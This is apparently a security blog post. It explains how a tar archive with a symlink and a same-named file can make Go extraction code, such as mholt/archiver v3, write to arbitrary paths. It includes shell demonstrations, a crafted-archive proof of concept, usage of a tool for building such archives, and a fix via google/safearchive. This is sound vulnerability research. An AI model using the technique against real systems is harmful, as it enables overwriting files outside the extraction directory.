---
title: "Sweet combination: Link-write Attack during extraction"
draft: true
date: 2024-08-09T08:20:35+02:00
tags:
- attack
- tar
---

I have recently done some development work and deep-dived into archive extraction. I identified during that work interesting behaviors which I will explain in the following.

<!--more--> 

_**TL;DR:**_ Tar archives can contain multiple entries with the same filename. Golang follows symlinks while calling [`os.Create(name string) (*File, error)`](https://pkg.go.dev/os#Create). The combination can lead to arbitrary writes during file extraction. 

## Observations

### Repeating name in tar files

First of all, an archive can contain multiple entries with the same name. Lets take for example the tar file `alice.tar` (created with [ref](https://go.dev/play/p/7TjHUzQLuL8)). The file contains two entries:

```shell
$ tar ztvf alice.tar
lrw-------  0 0      0           0  1 Jan  1970 rabbit_hole -> /tmp/wonderland
-rw-r--r--  0 0      0          39  1 Jan  1970 rabbit_hole

```

The first entry is a symlink, the second is a legit text file. If this archive is extracted with the `tar` cli, the symlink  is extracted and afterwards replaced by the text file:

```shell
$ tar xvf alice.tar
x rabbit_hole
x rabbit_hole

$ ls -l
total 24
-rw-r--r--  1 jan  staff   2,5K  9 Aug 17:33 alice.tar
-rw-r--r--  1 jan  staff    39B  1 Jan  1970 rabbit_hole

$ file rabbit_hole
rabbit_hole: ASCII text, with no line terminators
```

Let's keep that behavior for now in mind and let us step to the next interesting observation.

### File creation in Golang

Files can be created in Golang with [`os.Create(name string) (*File, error)`](https://pkg.go.dev/os#Create). Subsequently data can be written into the `File` and finally be closed. The [documentation states following](https://pkg.go.dev/os#Create:~:text=Create%20creates%20or%20truncates%20the%20named%20file.%20If%20the%20file%20already%20exists%2C%20it%20is%20truncated.%20If%20the%20file%20does%20not%20exist%2C%20it%20is%20created%20with%20mode%200666%20(before%20umask).):

> Create creates or truncates the named file. If the file already exists, it is truncated. If the file does not exist, it is created with mode 0666 (before umask).

The interesting thing about that function is that the provided `name` can also be an already existing file (or even better: a symlink!). My first expectation was that the symlink will be replaced/truncated and replaced with the file content – similar to the `tar` behavior.

I implemented such behaviors in [Golang](https://go.dev/play/p/kunYCVn-_Zp) and in [Python](https://www.online-python.com/WAhSH75ia2) and it revealed that if we provide a symlink to the create function, the symlink gets traversed and the content is written to the destination! 

Funny, right? 😃

## Verification of assumption

To verify my assumption, I picked a wide-spread existing OSS extraction implementation for archives in Golang – [mholt/archiver@v3](https://github.com/mholt/archiver/tree/v3-deprecated) – which is straightforward to use ([full code example](https://go.dev/play/p/NPqSWEOWphV)):  

```golang
// parse command line arguments
input := os.Args[1]
output := os.Args[2]

// unarchive the file
archiver.Unarchive(input, output)

// print the result
fmt.Printf("Unarchived %s to %s\n", input, output)
```

If we use this simple code snipped to extract our previous crafted archive, we get following result:

```
$ go run ./main.go alice.tar .
Unarchived alice.tar to .

$ ls -l
total 24
[...]
-rw-r--r--  1 jan  staff   299B  9 Aug 18:31 main.go
lrwxr-xr-x  1 jan  staff    15B  9 Aug 18:38 rabbit_hole@ -> /tmp/wonderland

$ cat /tmp/wonderland
Hello Alice, welcome to the wonderland!

```

So, we are capable of archiving an arbitrary write to the filesystem, by traversing the link during the file creation process.



## PoC tool: golinkwrite

If you want to create a potential malicious archive, feel free to use [NodyHub/golinkwrite](https://github.com/NodyHub/golinkwrite) to craft your own tar archives with double entries: 

```shell
$ echo 'Hello Alice :wave:!' | tee rabbit_hole.txt
Hello Alice :wave:!

$ golinkwrite -v rabbit_hole.txt /tmp/hi.txt alice.tar
time=2024-08-09T19:11:35.266+02:00 level=DEBUG msg="command line  parameters" cli="{Input:rabbit_hole.txt Target:/tmp/hi.txt Output:alice.tar Verbose:true}"
time=2024-08-09T19:11:35.266+02:00 level=DEBUG msg="input permissions" perm=-rw-r--r--
time=2024-08-09T19:11:35.266+02:00 level=DEBUG msg="input size" size=20
time=2024-08-09T19:11:35.266+02:00 level=INFO msg="tar file created" output=alice.tar

$ tar ztvf alice.tar
lrw-r--r--  0 0      0           0  1 Jan  1970 rabbit_hole.txt -> /tmp/hi.txt
-rw-r--r--  0 0      0          20  1 Jan  1970 rabbit_hole.txt
```

## Remedition

The root-cause of this behavior is that symlinks are traversed during the extraction. You could ether implement your own checks or leverage the implementation from Google: [google/safearchive](https://github.com/google/safearchive) to ensure that symlinks from an archived are not traversed during extraction. Further details can be found in the blogpost [The Family of Safe Golang Libraries is Growing!](https://bughunters.google.com/blog/4925068200771584/the-family-of-safe-golang-libraries-is-growing). 
